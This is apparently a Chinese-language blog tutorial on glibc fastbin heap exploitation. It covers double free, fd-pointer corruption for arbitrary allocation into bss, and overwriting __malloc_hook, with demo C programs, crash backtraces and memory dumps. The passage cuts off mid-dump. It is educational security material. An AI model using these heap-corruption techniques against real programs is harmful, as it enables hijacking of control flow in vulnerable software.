Backtrace: =========<br>/lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[0x7fbb7a36c7e5]<br>/lib/x86_64-linux-gnu/libc.so.6(+0x<span class="hljs-number">8037</span>a)[0x7fbb7a<span class="hljs-number">3753</span>7a]<br>/lib/x86_64-linux-gnu/libc.so.6(cfree+0x4c)[0x7fbb7a<span class="hljs-number">3795</span>3c]<br>./tst[0x<span class="hljs-number">4005</span>a2]<br>/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7fbb7a<span class="hljs-number">315830</span>]<br>./tst[0x<span class="hljs-number">400499</span>]<br>======= Memory map: ========<br><span class="hljs-number">00400000-004010</span>00 r-xp <span class="hljs-number">00000000</span> 08:01 <span class="hljs-number">105257</span>0                            /home/Ox9A82/tst/tst<br><span class="hljs-number">00600000-006010</span>00 r--p <span class="hljs-number">00000000</span> 08:01 <span class="hljs-number">105257</span>0                            /home/Ox9A82/tst/tst<br><span class="hljs-number">00601000-006020</span>00 rw-p <span class="hljs-number">00001000</span> 08:01 <span class="hljs-number">105257</span>0                            /home/Ox9A82/tst/tst<br><span class="hljs-number">02200000-022210</span>00 rw-p <span class="hljs-number">00000000</span> 00:00 0                                  [heap]<br>7fbb<span class="hljs-number">74000000</span>-7fbb<span class="hljs-number">74021000</span> rw-p <span class="hljs-number">00000000</span> 00:00 0<br>7fbb<span class="hljs-number">74021000</span>-7fbb<span class="hljs-number">78000000</span> ---p <span class="hljs-number">00000000</span> 00:00 0<br>7fbb7a0df000-7fbb7a0f<span class="hljs-number">5000</span> r-xp <span class="hljs-number">00000000</span> 08:01 <span class="hljs-number">398790</span>                     /lib/x86_64-linux-gnu/libgcc_s.so.1<br>7fbb7a0f<span class="hljs-number">5000</span>-7fbb7a2f<span class="hljs-number">4000</span> ---p <span class="hljs-number">00016000</span> 08:01 <span class="hljs-number">398790</span>                     /lib/x86_64-linux-gnu/libgcc_s.so.1<br>7fbb7a2f<span class="hljs-number">4000</span>-7fbb7a2f<span class="hljs-number">5000</span> rw-p <span class="hljs-number">00015000</span> 08:01 <span class="hljs-number">398790</span>                     /lib/x86_64-linux-gnu/libgcc_s.so.1<br>7fbb7a2f<span class="hljs-number">5000</span>-7fbb7a4b<span class="hljs-number">5000</span> r-xp <span class="hljs-number">00000000</span> 08:01 <span class="hljs-number">415688</span>                     /lib/x86_64-linux-gnu/libc-2.23.so<br>7fbb7a4b<span class="hljs-number">5000</span>-7fbb7a6b<span class="hljs-number">5000</span> ---p 001c<span class="hljs-number">0000</span> 08:01 <span class="hljs-number">415688</span>                     /lib/x86_64-linux-gnu/libc-2.23.so<br>7fbb7a6b<span class="hljs-number">5000</span>-7fbb7a6b<span class="hljs-number">9000</span> r--p 001c<span class="hljs-number">0000</span> 08:01 <span class="hljs-number">415688</span>                     /lib/x86_64-linux-gnu/libc-2.23.so<br>7fbb7a6b<span class="hljs-number">9000</span>-7fbb7a6bb000 rw-p 001c<span class="hljs-number">4000</span> 08:01 <span class="hljs-number">415688</span>                     /lib/x86_64-linux-gnu/libc-2.23.so<br>7fbb7a6bb000-7fbb7a6bf000 rw-p <span class="hljs-number">00000000</span> 00:00 0<br>7fbb7a6bf000-7fbb7a6e<span class="hljs-number">5000</span> r-xp <span class="hljs-number">00000000</span> 08:01 <span class="hljs-number">407367</span>                     /lib/x86_64-linux-gnu/ld-2.23.so<br>7fbb7a8c<span class="hljs-number">7000</span>-7fbb7a8ca000 rw-p <span class="hljs-number">00000000</span> 00:00 0<br>7fbb7a8e<span class="hljs-number">1000</span>-7fbb7a8e<span class="hljs-number">4000</span> rw-p <span class="hljs-number">00000000</span> 00:00 0<br>7fbb7a8e<span class="hljs-number">4000</span>-7fbb7a8e<span class="hljs-number">5000</span> r--p <span class="hljs-number">00025000</span> 08:01 <span class="hljs-number">407367</span>                     /lib/x86_64-linux-gnu/ld-2.23.so<br>7fbb7a8e<span class="hljs-number">5000</span>-7fbb7a8e<span class="hljs-number">6000</span> rw-p <span class="hljs-number">00026000</span> 08:01 <span class="hljs-number">407367</span>                     /lib/x86_64-linux-gnu/ld-2.23.so<br>7fbb7a8e<span class="hljs-number">6000</span>-7fbb7a8e<span class="hljs-number">7000</span> rw-p <span class="hljs-number">00000000</span> 00:00 0<br>7ffcd2f<span class="hljs-number">9300</span>0-7ffcd2fb<span class="hljs-number">4000</span> rw-p <span class="hljs-number">00000000</span> 00:00 0                          [stack]<br>7ffcd2fc<span class="hljs-number">8000</span>-7ffcd2fca000 r--p <span class="hljs-number">00000000</span> 00:00 0                          [vvar]<br>7ffcd2fca000-7ffcd2fcc000 r-xp <span class="hljs-number">00000000</span> 00:00 0                          [vdso]<br>ffffffffff<span class="hljs-number">600000</span>-ffffffffff<span class="hljs-number">601000</span> r-xp <span class="hljs-number">00000000</span> 00:00 0                  [vsyscall]<br>已放弃 (核心已转储)<br></code></pre></td></tr></table></figure><p>如果我们在 chunk1 释放后，再释放 chunk2 ，这样 main_arena 就指向 chunk2 而不是 chunk1 了，此时我们再去释放 chunk1 就不再会被检测到。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">void</span> *chunk1,*chunk2,*chunk3;<br>    chunk1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    chunk2=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br><br>    <span class="hljs-built_in">free</span>(chunk1);<br>    <span class="hljs-built_in">free</span>(chunk2);<br>    <span class="hljs-built_in">free</span>(chunk1);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>第一次释放<code>free(chunk1)</code></p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408041258336.png"></p><p>第二次释放<code>free(chunk2)</code></p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408041258513.png"></p><p>第三次释放<code>free(chunk1)</code></p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408041258763.png"></p><p>注意因为 chunk1 被再次释放因此其 fd 值不再为 0 而是指向 chunk2，这时如果我们可以控制 chunk1 的内容，便可以写入其 fd 指针从而实现在我们想要的任意地址分配 fastbin 块。 下面这个示例演示了这一点，首先跟前面一样构造 main_arena&#x3D;&gt;chunk1&#x3D;&gt;chun2&#x3D;&gt;chunk1 的链表。之后第一次调用 malloc 返回 chunk1 之后修改 chunk1 的 fd 指针指向 bss 段上的 bss_chunk，之后我们可以看到 fastbin 会把堆块分配到这里。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">chunk</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> pre_size;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> size;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> fd;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> bk;<br>&#125; CHUNK,*PCHUNK;<br><br>CHUNK bss_chunk;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">void</span> *chunk1,*chunk2,*chunk3;<br>    <span class="hljs-type">void</span> *chunk_a,*chunk_b;<br><br>    bss_chunk.size=<span class="hljs-number">0x21</span>;<br>    chunk1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    chunk2=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br><br>    <span class="hljs-built_in">free</span>(chunk1);<br>    <span class="hljs-built_in">free</span>(chunk2);<br>    <span class="hljs-built_in">free</span>(chunk1);<br><br>    chunk_a=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    *(<span class="hljs-type">long</span> <span class="hljs-type">long</span> *)chunk_a=&amp;bss_chunk;<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    chunk_b=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p&quot;</span>,chunk_b);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>在我的系统上 chunk_b 输出的值会是 0x601090，这个值位于 bss 段中正是我们之前设置的</p><p>CHUNK bss_chunk</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs dns">CHUNK bss_chunk<br>Start              End                Offset             Perm Path<br><span class="hljs-number">0</span>x00000<span class="hljs-number">00000400000</span> <span class="hljs-number">0</span>x00000<span class="hljs-number">00000401000</span> <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span> r-x /home/Ox9A82/tst/tst<br><span class="hljs-number">0</span>x00000<span class="hljs-number">00000600000</span> <span class="hljs-number">0</span>x00000<span class="hljs-number">00000601000</span> <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span> r-- /home/Ox9A82/tst/tst<br><span class="hljs-number">0</span>x00000<span class="hljs-number">00000601000</span> <span class="hljs-number">0</span>x00000<span class="hljs-number">00000602000</span> <span class="hljs-number">0</span>x00000<span class="hljs-number">00000001000</span> rw- /home/Ox9A82/tst/tst<br><span class="hljs-number">0</span>x00000<span class="hljs-number">00000602000</span> <span class="hljs-number">0</span>x00000<span class="hljs-number">00000623000</span> <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span> rw- [heap]<br><br><span class="hljs-number">0x601080</span> &lt;bss_chunk&gt;:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000021</span><br><span class="hljs-number">0x601090</span> &lt;bss_chunk+<span class="hljs-number">16</span>&gt;:<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x6010a0</span>:               <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x6010b0</span>:               <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x6010c0</span>:               <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br></code></pre></td></tr></table></figure><p>值得注意的是，我们在 main 函数的第一步就进行了<code>bss_chunk.size=0x21;</code>的操作，这是因为_int_malloc 会对欲分配位置的 size 域进行验证，如果其 size 与当前 fastbin 链表应有 size 不符就会抛出异常。</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs dns">*** Error in `./tst&#x27;: malloc(): memory corruption (fast): <span class="hljs-number">0</span>x00000<span class="hljs-number">00000601090</span> ***<br>======= Backtrace: =========<br>/lib/x86_64-linux-gnu/libc.so.<span class="hljs-number">6</span>(+<span class="hljs-number">0x777e5</span>)[<span class="hljs-number">0</span>x7f8f9deb27e5]<br>/lib/x86_64-linux-gnu/libc.so.<span class="hljs-number">6</span>(+<span class="hljs-number">0x82651</span>)[<span class="hljs-number">0</span>x7f8f9debd651]<br>/lib/x86_64-linux-gnu/libc.so.<span class="hljs-number">6</span>(__libc_malloc+<span class="hljs-number">0</span>x54)[<span class="hljs-number">0</span>x7f8f9debf184]<br>./tst[<span class="hljs-number">0x400636</span>]<br>/lib/x86_64-linux-gnu/libc.so.<span class="hljs-number">6</span>(__libc_start_main+<span class="hljs-number">0</span>xf0)[<span class="hljs-number">0</span>x7f8f9de5b830]<br>./tst[<span class="hljs-number">0x4004e9</span>]<br>======= Memory map: ========<br><span class="hljs-number">00400000</span>-<span class="hljs-number">00401000</span> r-xp <span class="hljs-number">00000000 08</span>:<span class="hljs-number">01 1052570</span>                            /home/Ox9A82/tst/tst<br><span class="hljs-number">00600000</span>-<span class="hljs-number">00601000</span> r--p <span class="hljs-number">00000000 08</span>:<span class="hljs-number">01 1052570</span>                            /home/Ox9A82/tst/tst<br><span class="hljs-number">00601000</span>-<span class="hljs-number">00602000</span> rw-p <span class="hljs-number">00001000 08</span>:<span class="hljs-number">01 1052570</span>                            /home/Ox9A82/tst/tst<br><span class="hljs-number">00</span>bc4000-<span class="hljs-number">00</span>be5000 rw-p <span class="hljs-number">00000000 00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span>                                  [heap]<br><span class="hljs-number">7</span>f<span class="hljs-number">8f98000000</span>-<span class="hljs-number">7</span>f<span class="hljs-number">8f98021000</span> rw-p <span class="hljs-number">00000000 00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span><br><span class="hljs-number">7</span>f<span class="hljs-number">8f98021000</span>-<span class="hljs-number">7</span>f8f<span class="hljs-number">9c000000</span> ---p <span class="hljs-number">00000000 00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span><br><span class="hljs-number">7</span>f8f9dc25000-<span class="hljs-number">7</span>f8f9dc3b000 r-xp <span class="hljs-number">00000000 08</span>:<span class="hljs-number">01 398790</span>                     /lib/x86_64-linux-gnu/libgcc_s.so.<span class="hljs-number">1</span><br><span class="hljs-number">7</span>f8f9dc3b000-<span class="hljs-number">7</span>f8f9de3a000 ---p <span class="hljs-number">00016000 08</span>:<span class="hljs-number">01 398790</span>                     /lib/x86_64-linux-gnu/libgcc_s.so.<span class="hljs-number">1</span><br><span class="hljs-number">7</span>f8f9de3a000-<span class="hljs-number">7</span>f8f9de3b000 rw-p <span class="hljs-number">00015000 08</span>:<span class="hljs-number">01 398790</span>                     /lib/x86_64-linux-gnu/libgcc_s.so.<span class="hljs-number">1</span><br><span class="hljs-number">7</span>f8f9de3b000-<span class="hljs-number">7</span>f8f9dffb000 r-xp <span class="hljs-number">00000000 08</span>:<span class="hljs-number">01 415688</span>                     /lib/x86_64-linux-gnu/libc-<span class="hljs-number">2</span>.<span class="hljs-number">23</span>.so<br><span class="hljs-number">7</span>f8f9dffb000-<span class="hljs-number">7</span>f8f9e1fb000 ---p <span class="hljs-number">001c0000</span> <span class="hljs-number">08</span>:<span class="hljs-number">01 415688</span>                     /lib/x86_64-linux-gnu/libc-<span class="hljs-number">2</span>.<span class="hljs-number">23</span>.so<br><span class="hljs-number">7</span>f8f9e1fb000-<span class="hljs-number">7</span>f8f9e1ff000 r--p <span class="hljs-number">001c0000</span> <span class="hljs-number">08</span>:<span class="hljs-number">01 415688</span>                     /lib/x86_64-linux-gnu/libc-<span class="hljs-number">2</span>.<span class="hljs-number">23</span>.so<br><span class="hljs-number">7</span>f8f9e1ff000-<span class="hljs-number">7</span>f<span class="hljs-number">8f9e201000</span> rw-p <span class="hljs-number">001c4000</span> <span class="hljs-number">08</span>:<span class="hljs-number">01 415688</span>                     /lib/x86_64-linux-gnu/libc-<span class="hljs-number">2</span>.<span class="hljs-number">23</span>.so<br><span class="hljs-number">7</span>f<span class="hljs-number">8f9e201000</span>-<span class="hljs-number">7</span>f<span class="hljs-number">8f9e205000</span> rw-p <span class="hljs-number">00000000 00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span><br><span class="hljs-number">7</span>f<span class="hljs-number">8f9e205000</span>-<span class="hljs-number">7</span>f8f<span class="hljs-number">9e22b000</span> r-xp <span class="hljs-number">00000000 08</span>:<span class="hljs-number">01 407367</span>                     /lib/x86_64-linux-gnu/ld-<span class="hljs-number">2</span>.<span class="hljs-number">23</span>.so<br><span class="hljs-number">7</span>f8f<span class="hljs-number">9e40d000</span>-<span class="hljs-number">7</span>f8f<span class="hljs-number">9e410000</span> rw-p <span class="hljs-number">00000000 00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span><br><span class="hljs-number">7</span>f8f<span class="hljs-number">9e427000</span>-<span class="hljs-number">7</span>f8f<span class="hljs-number">9e42a000</span> rw-p <span class="hljs-number">00000000 00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span><br><span class="hljs-number">7</span>f8f<span class="hljs-number">9e42a000</span>-<span class="hljs-number">7</span>f8f<span class="hljs-number">9e42b000</span> r--p <span class="hljs-number">00025000 08</span>:<span class="hljs-number">01 407367</span>                     /lib/x86_64-linux-gnu/ld-<span class="hljs-number">2</span>.<span class="hljs-number">23</span>.so<br><span class="hljs-number">7</span>f8f<span class="hljs-number">9e42b000</span>-<span class="hljs-number">7</span>f8f<span class="hljs-number">9e42c000</span> rw-p <span class="hljs-number">00026000 08</span>:<span class="hljs-number">01 407367</span>                     /lib/x86_64-linux-gnu/ld-<span class="hljs-number">2</span>.<span class="hljs-number">23</span>.so<br><span class="hljs-number">7</span>f8f<span class="hljs-number">9e42c000</span>-<span class="hljs-number">7</span>f8f<span class="hljs-number">9e42d000</span> rw-p <span class="hljs-number">00000000 00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span><br><span class="hljs-number">7</span>fff<span class="hljs-number">71a94000</span>-<span class="hljs-number">7</span>fff71ab5000 rw-p <span class="hljs-number">00000000 00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span>                          [stack]<br><span class="hljs-number">7</span>fff71bd9000-<span class="hljs-number">7</span>fff71bdb000 r--p <span class="hljs-number">00000000 00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span>                          [vvar]<br><span class="hljs-number">7</span>fff71bdb000-<span class="hljs-number">7</span>fff71bdd000 r-xp <span class="hljs-number">00000000 00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span>                          [vdso]<br>ffffffffff600000-ffffffffff601000 r-xp <span class="hljs-number">00000000 00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span>                  [vsyscall]<br>已放弃 (核心已转储)<br></code></pre></td></tr></table></figure><p>_int_malloc 中的校验如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="hljs-number">0</span>))<br>    &#123;<br>      errstr = <span class="hljs-string">&quot;malloc(): memory corruption (fast)&quot;</span>;<br>    errout:<br>      malloc_printerr (check_action, errstr, chunk2mem (victim));<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h3><p>通过 fastbin double free 我们可以使用多个指针控制同一个堆块，这可以用于篡改一些堆块中的关键数据域或者是实现类似于类型混淆的效果。 如果更进一步修改 fd 指针，则能够实现任意地址分配堆块的效果 (首先要通过验证)，这就相当于任意地址写任意值的效果。</p><h2 id="House-Of-Spirit"><a href="#House-Of-Spirit" class="headerlink" title="House Of Spirit"></a>House Of Spirit</h2><p>可以看这篇<a href="https://tkymax.github.io/2024/08/02/House-of-Spirit%E6%94%BB%E5%87%BB/">博客</a></p><h2 id="Alloc-to-Stack-Arbitrary-Alloc"><a href="#Alloc-to-Stack-Arbitrary-Alloc" class="headerlink" title="Alloc to Stack &amp;&amp; Arbitrary Alloc"></a>Alloc to Stack &amp;&amp; Arbitrary Alloc</h2><h3 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h3><p>对于这两个技术，我个人感觉十分相似，都是篡改fd指针指向伪造的chunk，而第二种技术相对来说，涵盖了第一种，我们直接简绍第二种</p><p>事实上只要满足目标地址存在合法的 size 域（这个 size 域是构造的，还是自然存在的都无妨），我们可以把 chunk 分配到任意的可写内存中，比如 bss、heap、data、stack 等等。</p><h3 id="演示-1"><a href="#演示-1" class="headerlink" title="演示"></a>演示</h3><p>在这个例子，我们使用字节错位来实现直接分配 fastbin 到<strong>_malloc_hook 的位置，相当于覆盖_malloc_hook 来控制程序流程。</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><br><br>    <span class="hljs-type">void</span> *chunk1;<br>    <span class="hljs-type">void</span> *chunk_a;<br><br>    chunk1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x60</span>);<br><br>    <span class="hljs-built_in">free</span>(chunk1);<br><br>    *(<span class="hljs-type">long</span> <span class="hljs-type">long</span> *)chunk1=<span class="hljs-number">0x7ffff7dd1af5</span><span class="hljs-number">-0x8</span>;<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x60</span>);<br>    chunk_a=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x60</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里的 0x7ffff7dd1af5 是我根据本机的情况得出的值，这个值是怎么获得的呢？首先我们要观察欲写入地址附近是否存在可以字节错位的情况。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0x7ffff7dd1a88</span> <span class="hljs-number">0</span>x0  <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x7ffff7dd1a90</span> <span class="hljs-number">0</span>x0  <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x7ffff7dd1a98</span> <span class="hljs-number">0</span>x0  <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x7ffff7dd1aa0</span> <span class="hljs-number">0</span>x0  <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x7ffff7dd1aa8</span> <span class="hljs-number">0</span>x0  <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x7ffff7dd1ab0</span> <span class="hljs-number">0</span>x0  <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x7ffff7dd1ab8</span> <span class="hljs-number">0</span>x0  <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x7ffff7dd1ac0</span> <span class="hljs-number">0</span>x0  <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x7ffff7dd1ac8</span> <span class="hljs-number">0</span>x0  <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x7ffff7dd1ad0</span> <span class="hljs-number">0</span>x0  <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x7ffff7dd1ad8</span> <span class="hljs-number">0</span>x0  <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x7ffff7dd1ae0</span> <span class="hljs-number">0</span>x0  <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x7ffff7dd1ae8</span> <span class="hljs-number">0</span>x0  <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x7ffff7dd1af0</span> <span class="hljs-number">0</span>x60 <span class="hljs-number">0</span>x2 <span class="hljs-number">0</span>xdd <span class="hljs-number">0</span>xf7 <span class="hljs-number">0</span>xff <span class="hljs-number">0</span>x7f <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x7ffff7dd1af8</span> <span class="hljs-number">0</span>x0  <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x7ffff7dd1b00</span> <span class="hljs-number">0</span>x20 <span class="hljs-number">0</span>x2e <span class="hljs-number">0</span>xa9 <span class="hljs-number">0</span>xf7 <span class="hljs-number">0</span>xff <span class="hljs-number">0</span>x7f <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x7ffff7dd1b08</span> <span class="hljs-number">0</span>x0  <span class="hljs-number">0</span>x2a <span class="hljs-number">0</span>xa9 <span class="hljs-number">0</span>xf7 <span class="hljs-number">0</span>xff <span class="hljs-number">0</span>x7f <span 